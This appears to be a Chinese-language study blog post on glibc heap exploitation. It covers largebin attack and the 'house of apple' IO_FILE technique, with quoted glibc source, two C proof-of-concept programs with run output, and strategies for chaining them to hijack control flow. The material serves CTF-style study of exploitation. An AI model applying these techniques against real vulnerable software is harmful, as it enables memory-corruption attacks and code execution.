---
title: house_of_apple系列
date: 2023-11-11 21:09:56
tags:
 - "glibc"
---

# House  of apple系列&&复习larginbin attack

## 复习largebin_attack

largebin和一般的chunk不同，结构为

| prev_size   | size        |
| ----------- | ----------- |
| fd          | bk          |
| fd_nextsize | bk_nextsize |
| content     | content     |
|             |             |
|             |             |

可以看到，largebin比平常的chunk多了两个位，一个是fd_nextsize指向前一个比自己小的chunk，bk_nextsize指向后一个size比自己大的size

## malloc_consolidate

原文 [堆漏洞挖掘中的malloc_consolidate与FASTBIN_CONSOLIDATION_THRESHOLD-CSDN博客](https://blog.csdn.net/qq_41453285/article/details/97627411)

这里关乎着碎片堆的整理，目前看起来有以下几种情况

1. 当申请一个堆块大于 `smallbin`的最小大小时，会触发 ` malloc_consolidate()`  ，他会首先把 `fastbin` 中相邻的块 *(指物理地址相邻)* 进行合并，合并后放入 `unsortedbin` 中，随后，为了分配申请的chunk，会对 `unsortedbin` 进行遍历，然后将其归为到 `smallbin` 等链表中，使得 `fastbin` 清空
2. `unsortedbin`  中有较大的 `freechunk` 够切割的情况下，切割这个 `chunk` ，多余的部分成为 `last_reminder` 仍然放在`unsortedbin` 中，其他的进行整理放到对应的 `chunk`
3. `malloc` 的时候发现没有可用的 `chunk` 并且去切割 `top_chunk` 的时候仍然不够分割，这时候就会对所有的 `chunk` 进行一次整理
4. **特别的** 只有一和三会对 `fastbin` 进行整理，第二种情况并不会对其进行整理

## largebin_attack

原文： [【精选】好好说话之Large Bin Attack_hollk的博客-CSDN博客](https://blog.csdn.net/qq_41202237/article/details/112825556)

首先放出源码

```cpp
          /* remove from unsorted list */
          unsorted_chunks (av)->bk = bck;
          bck->fd = unsorted_chunks (av);

          /* Take now instead of binning if exact fit */

          if (size == nb)
            {
              set_inuse_bit_at_offset (victim, size);
              if (av != &main_arena)
                victim->size |= NON_MAIN_ARENA;
              check_malloced_chunk (av, victim, nb);
              void *p = chunk2mem (victim);
              alloc_perturb (p, bytes);
              return p;
            }

          /* place chunk in bin */

          if (in_smallbin_range (size))
            {
              victim_index = smallbin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;
            }
          else
            {
              victim_index = largebin_index (size);
              bck = bin_at (av, victim_index);
              fwd = bck->fd;

              /* maintain large bins in sorted order */
              if (fwd != bck)
                {
                  /* Or with inuse bit to speed comparisons */
                  size |= PREV_INUSE;
                  /* if smaller than smallest, bypass loop below */
                  assert ((bck->bk->size & NON_MAIN_ARENA) == 0);
                  if ((unsigned long) (size) < (unsigned long) (bck->bk->size))
                    {
                      fwd = bck;
                      bck = bck->bk;

                      victim->fd_nextsize = fwd->fd;
                      victim->bk_nextsize = fwd->fd->bk_nextsize;
                      fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim;
                    }
                  else
                    {
                      assert ((fwd->size & NON_MAIN_ARENA) == 0);
                      while ((unsigned long) size < fwd->size)
                        {
                          fwd = fwd->fd_nextsize;
                          assert ((fwd->size & NON_MAIN_ARENA) == 0);
                        }

                      if ((unsigned long) size == (unsigned long) fwd->size)
                        /* Always insert in the second position.  */
                        fwd = fwd->fd;
                      else
                        {
                          victim->fd_nextsize = fwd;
                          victim->bk_nextsize = fwd->bk_nextsize;
                          fwd->bk_nextsize = victim;
                          victim->bk_nextsize->fd_nextsize = victim;
                        }
                      bck = fwd->bk;
                    }
                }
              else
                victim->fd_nextsize = victim->bk_nextsize = victim;
            }

          mark_bin (av, victim_index);
          victim->bk = bck;
          victim->fd = fwd;
          fwd->bk = victim;
          bck->fd = victim;

```

放入 `largebin` 的逻辑在最后，经过上面的了解，我们不难知道，假设我们在 `largebin` 中已经放入了一个 `chunkA` 之后再放入一个比其稍大的 `chunkB` ，提前在b的 `bk` 和 `bk_next_size` 位置写入` addr1-0x10` , `addr2-0x20` 就可以在这两个地址写入b的地址，也就是可以通过 **lagrbin_attack** 强制完成一次任意地址写入一个堆地址

### POC

```c
  1 // gcc -g -no-pie hollk.c -o hollk
  2 #include <stdio.h>
  3 #include <stdlib.h>
  4 
  5 int main()
  6 {
  7 
  8     unsigned long stack_var1 = 0;
  9     unsigned long stack_var2 = 0;
 10 
 11     fprintf(stderr, "stack_var1 (%p): %ld\n", &stack_var1, stack_var1);
 12     fprintf(stderr, "stack_var2 (%p): %ld\n\n", &stack_var2, stack_var2);
 13 
 14     unsigned long *p1 = malloc(0x320);
 15     malloc(0x20);
 16     unsigned long *p2 = malloc(0x400);
 17     malloc(0x20);
 18     unsigned long *p3 = malloc(0x400);
 19     malloc(0x20);
 20 
 21     free(p1);
 22     free(p2);
 23 
 24     void* p4 = malloc(0x90);
 25 	//触发`__malloc_cosilidate` p1进入largebin， p2一部分被切割 剩下的成为 `last_reminder` 留在unsortedbin
 26     free(p3);
 27 
 28     p2[-1] = 0x3f1;
 29     p2[0] = 0;
 30     p2[2] = 0;
 31     p2[1] = (unsigned long)(&stack_var1 - 2);
 32     p2[3] = (unsigned long)(&stack_var2 - 4);
 33 
 34     malloc(0x90);
 35 	// 再次触发 `__malloc-consilidate` p2进入largebin，之前在p2已经设置好bk和bk_nextsize 直接触发largebinattack 
 36     fprintf(stderr, "stack_var1 (%p): %p\n", &stack_var1, (void *)stack_var1);
 37     fprintf(stderr, "stack_var2 (%p): %p\n", &stack_var2, (void *)stack_var2);
 38 
 39     return 0;
 40 }

```



## house of apple

原文[原创 House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-273418.htm#总结)

### 利用条件

- 程序从 `main` 函数返回或者可以调用 `exit` 函数
- 能够泄露出heapbase和libc地址
- 能够使用一次 largebin_attack

### 原理

当程序从main函数返回或者执行exit的时候调用链如下

> exit -> fcloseall -> _IO_cleanup -> _IO_flush_all_lockp -> _IO_OVERFLOW

和之前的FSOP一样，最后会调用_IO_OVERFLOW

使用 `largebin_attack` 可以劫持 `_IO_list_all` 变量，替换为伪造的 `IO_FILE` 结构体，我们仍然可以利用某些 IO 流函数去修改其他地方的值

```cpp
struct _IO_FILE_complete
{
  struct _IO_FILE _file;
  __off64_t _offset;
  /* Wide character stream stuff.  */
  struct _IO_codecvt *_codecvt;
  struct _IO_wide_data *_wide_data; // 劫持这个变量
  struct _IO_FILE *_freeres_list;
  void *_freeres_buf;
  size_t __pad5;
  int _mode;
  /* Make sure we don't get into trouble again.  */
  char _unused2[15 * sizeof (int) - 4 * sizeof (void *) - sizeof (size_t)];
};

amd64：

0x0:'_flags',
0x8:'_IO_read_ptr',
0x10:'_IO_read_end',
0x18:'_IO_read_base',
0x20:'_IO_write_base',
0x28:'_IO_write_ptr',
0x30:'_IO_write_end',
0x38:'_IO_buf_base',
0x40:'_IO_buf_end',
0x48:'_IO_save_base',
0x50:'_IO_backup_base',
0x58:'_IO_save_end',
0x60:'_markers',
0x68:'_chain',
0x70:'_fileno',
0x74:'_flags2',
0x78:'_old_offset',
0x80:'_cur_column',
0x82:'_vtable_offset',
0x83:'_shortbuf',
0x88:'_lock',
0x90:'_offset',
0x98:'_codecvt',
0xa0:'_wide_data',
0xa8:'_freeres_list',
0xb0:'_freeres_buf',
0xb8:'__pad5',
0xc0:'_mode',
0xc4:'_unused2',
0xd8:'vtable'
```

随后我们伪造 `_IO_FILE` 结构体，这时候我们要利用到一个函数 `_IO_wstrn_overflow` 

```cpp
static wint_t
_IO_wstrn_overflow (FILE *fp, wint_t c)
{
  /* When we come to here this means the user supplied buffer is
     filled.  But since we must return the number of characters which
     would have been written in total we must provide a buffer for
     further use.  We can do this by writing on and on in the overflow
     buffer in the _IO_wstrnfile structure.  */
  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;
 
  if (fp->_wide_data->_IO_buf_base != snf->overflow_buf)
    {
      _IO_wsetb (fp, snf->overflow_buf,
         snf->overflow_buf + (sizeof (snf->overflow_buf)
                      / sizeof (wchar_t)), 0);
 
      fp->_wide_data->_IO_write_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_base = snf->overflow_buf;
      fp->_wide_data->_IO_read_ptr = snf->overflow_buf;
      fp->_wide_data->_IO_read_end = (snf->overflow_buf
                      + (sizeof (snf->overflow_buf)
                     / sizeof (wchar_t)));
    }
 
  fp->_wide_data->_IO_write_ptr = snf->overflow_buf;
  fp->_wide_data->_IO_write_end = snf->overflow_buf;
 
  /* Since we are not really interested in storing the characters
     which do not fit in the buffer we simply ignore it.  */
  return c;
}
```

分析一下这个函数，首先将`fp`强转为`_IO_wstrnfile *`指针，然后判断`fp->_wide_data->_IO_buf_base != snf->overflow_buf`是否成立（一般肯定是成立的），如果成立则会对`fp->_wide_data`的`_IO_write_base`、`_IO_read_base`、`_IO_read_ptr`和`_IO_read_end`赋值为`snf->overflow_buf`或者与该地址一定范围内偏移的值；最后对`fp->_wide_data`的`_IO_write_ptr`和`_IO_write_end`赋值。

也就是说，只要控制了`fp->_wide_data`，就可以控制从`fp->_wide_data`开始一定范围内的内存的值，也就等同于**任意地址写已知地址**。

`_IO_wstrn_file` 涉及到的结构体

```cpp
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer_unused;
  _IO_free_type _free_buffer_unused;
};
 
struct _IO_streambuf
{
  FILE _f;
  const struct _IO_jump_t *vtable;
};
 
typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;
} _IO_strfile;
 
typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  char overflow_buf[64];
} _IO_strnfile;
 
 
typedef struct
{
  _IO_strfile f;
  /* This is used for the characters which do not fit in the buffer
     provided by the user.  */
  wchar_t overflow_buf[64]; // overflow_buf在这里********
} _IO_wstrnfile
```

其中 `overflow_buf` 相对于 `_IO_FILE` 的偏移为 **0xf0**

`struct  _IO_wide_data` 如下

```cpp
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;    /* Current read pointer */
  wchar_t *_IO_read_end;    /* End of get area. */
  wchar_t *_IO_read_base;    /* Start of putback+get area. */
  wchar_t *_IO_write_base;    /* Start of put area. */
  wchar_t *_IO_write_ptr;    /* Current put pointer. */
  wchar_t *_IO_write_end;    /* End of put area. */
  wchar_t *_IO_buf_base;    /* Start of reserve area. */
  wchar_t *_IO_buf_end;        /* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;    /* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;    /* Pointer to first valid character of
                   backup area */
  wchar_t *_IO_save_end;    /* Pointer to end of non-current get area. */
 
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
}
```

### POC

```cpp
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>
 
void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setvbuf(stderr, 0, 2, 0);
    puts("[*] allocate a 0x100 chunk");
    size_t *p1 = malloc(0xf0);
    size_t *tmp = p1;
    size_t old_value = 0x1122334455667788;
    for (size_t i = 0; i < 0x100 / 8; i++)
    {
        p1[i] = old_value;
    }
    puts("===========================old value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================old value=======================");
 
    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t stderr_write_ptr_addr = puts_addr + 0x1997b8;
    printf("[*] stderr->_IO_write_ptr address: %p\n", (void *)stderr_write_ptr_addr);
    size_t stderr_flags2_addr = puts_addr + 0x199804;
    printf("[*] stderr->_flags2 address: %p\n", (void *)stderr_flags2_addr);
    size_t stderr_wide_data_addr = puts_addr + 0x199830;
    printf("[*] stderr->_wide_data address: %p\n", (void *)stderr_wide_data_addr);
    size_t sdterr_vtable_addr = puts_addr + 0x199868;
    printf("[*] stderr->vtable address: %p\n", (void *)sdterr_vtable_addr);
    size_t _IO_wstrn_jumps_addr = puts_addr + 0x194ed0;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
 
    puts("[+] step 1: change stderr->_IO_write_ptr to -1");
    *(size_t *)stderr_write_ptr_addr = (size_t)-1;
 
    puts("[+] step 2: change stderr->_flags2 to 8");
    *(size_t *)stderr_flags2_addr = 8;
 
    puts("[+] step 3: replace stderr->_wide_data with the allocated chunk");
    *(size_t *)stderr_wide_data_addr = (size_t)p1;
 
    puts("[+] step 4: replace stderr->vtable with _IO_wstrn_jumps");
    *(size_t *)sdterr_vtable_addr = (size_t)_IO_wstrn_jumps_addr;
 
    puts("[+] step 5: call fcloseall and trigger house of apple");
    fcloseall();
    tmp = p1;
    puts("===========================new value=======================");
    for (size_t i = 0; i < 4; i++)
    {
        printf("[%p]: 0x%016lx  0x%016lx\n", tmp, tmp[0], tmp[1]);
        tmp += 2;
    }
    puts("===========================new value=======================");
}
```

即做了如下修改：

```cpp
stderr+0x28 = -1（stderr->_IO_write_ptr）
stderr+0x74 = 8（stderr->_flags2）
stderr+0xa0 = target（stderr->_wide_data）
stderr+0xd8 == _IO_wstrn_jumps（stderr->vtable）
```

输出结果为

```bash
roderick@ee8b10ad26b9:~/hack$ gcc demo.c -o demo -g -w && ./demo
[*] allocate a 0x100 chunk
===========================old value=======================
[0x55cfb956d2a0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2b0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2c0]: 0x1122334455667788  0x1122334455667788
[0x55cfb956d2d0]: 0x1122334455667788  0x1122334455667788
===========================old value=======================
[*] puts address: 0x7f648b8a6ef0
[*] stderr->_IO_write_ptr address: 0x7f648ba406a8
[*] stderr->_flags2 address: 0x7f648ba406f4
[*] stderr->_wide_data address: 0x7f648ba40720
[*] stderr->vtable address: 0x7f648ba40758
[*] _IO_wstrn_jumps address: 0x7f648ba3bdc0
[+] step 1: change stderr->_IO_write_ptr to -1
[+] step 2: change stderr->_flags2 to 8
[+] step 3: replace stderr->_wide_data with the allocated chunk
[+] step 4: replace stderr->vtable with _IO_wstrn_jumps
[+] step 5: call fcloseall and trigger house of apple
===========================new value=======================
[0x55cfb956d2a0]: 0x00007f648ba40770  0x00007f648ba40870
[0x55cfb956d2b0]: 0x00007f648ba40770  0x00007f648ba40770
[0x55cfb956d2c0]: 0x00007f648ba40770  0x00007f648ba40770
[0x55cfb956d2d0]: 0x00007f648ba40770  0x00007f648ba40870
===========================new value=======================
```

## 利用思路

### 思路一：修改tcache线程变量

这里需要利用 `house of pig` ，利用 `_IO_str_overflow` 中的 `malloc` 进行的任意地址分配并且利用 `memcpy` 进行覆盖

```cpp
int
_IO_str_overflow (FILE *fp, int c)
{
        // ......
      char *new_buf;
      char *old_buf = fp->_IO_buf_base; // 赋值为old_buf
      size_t old_blen = _IO_blen (fp);
      size_t new_size = 2 * old_blen + 100;
      if (new_size < old_blen)
        return EOF;
      new_buf = malloc (new_size); // 这里任意地址分配
      if (new_buf == NULL)
        {
          /*      __ferror(fp) = 1; */
          return EOF;
        }
      if (old_buf)
        {
          memcpy (new_buf, old_buf, old_blen); // 劫持_IO_buf_base后即可任意地址写任意值
          free (old_buf);
      // .......
  }
```

- 伪造至少两个`_IO_FILE`结构体
- 第一个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_wstrn_overflow`函数修改`tcache`全局变量为已知值，也就控制了`tcache bin`的分配
- 第二个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_str_overflow`中的`malloc`函数任意地址分配，并使用`memcpy`使得能够**任意地址写任意值**
- 利用两次任意地址写任意值修改`pointer_guard`和`IO_accept_foreign_vtables`的值绕过`_IO_vtable_check`函数的检测（或者利用一次任意地址写任意值修改`libc.got`里面的函数地址，很多`IO`流函数调用`strlen/strcpy/memcpy/memset`等都会调到`libc.got`里面的函数）
- 利用一个`_IO_FILE`，随意伪造`vtable`劫持程序控制流即可

### 思路二：劫持mp__结构体

该思路与上述思路差不多，不过对`tcachebin`分配的劫持是通过修改`mp_.tcache_bins`这个变量。打这个结构体的好处是在攻击远程时不需要爆破地址，因为线程全局变量、`tls`结构体的地址本地和远程并不一定是一样的，有时需要爆破。

利用步骤如下：

- 伪造至少两个`_IO_FILE`结构体
- 第一个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_wstrn_overflow`函数修改`mp_.tcache_bins`为很大的值，使得很大的`chunk`也通过`tcachebin`去管理
- 接下来的过程与上面的思路是一样的

### 思路三：利用house_of_emma

该思路其实就是`house of apple + house of emma`。

利用步骤如下：

- 伪造两个`_IO_FILE`结构体
- 第一个`_IO_FILE`结构体执行`_IO_OVERFLOW`的时候，利用`_IO_wstrn_overflow`函数修改`tls`结构体`pointer_guard`的值为已知值
- 第二个`_IO_FILE`结构体用来做`house of emma`利用即可控制程序执行流

### 思路四：利用house_of_corrision

这个思路也很灵活，修改掉这个变量后，直接释放超大的`chunk`，去覆盖掉`point_guard`或者`tcache`变量。我称之为`house of apple + house of corrision`。

利用过程与前面也基本是大同小异，就不在此详述了。

其实也有其他的思路，比如还可以劫持`main_arena`，不过这个结构体利用起来会更复杂，所需要的空间将更大。而在上述思路的利用过程中，可以选择错位构造`_IO_FILE`结构体，只需要保证关键字段满足要求即可，这样可以更加节省空间。